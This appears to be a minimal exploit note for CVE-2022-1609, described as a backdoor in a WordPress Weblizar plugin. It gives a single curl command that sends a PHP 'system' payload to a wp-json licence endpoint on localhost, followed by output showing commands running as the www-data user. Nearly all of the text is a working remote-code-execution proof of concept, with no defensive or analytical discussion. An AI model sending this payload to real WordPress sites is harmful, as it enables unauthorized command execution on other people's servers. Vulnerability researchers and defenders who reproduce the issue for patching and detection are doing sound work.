# CVE-2022-1609
CVE-2022-1609 WordPress Weblizar后门


curl -s -d 'blowfish=1' -d "blowf=system('id');" 'http://localhost:8888/wp-json/am-member/license'

uid=33(www-data) gid=33(www-data) groups=33(www-data)
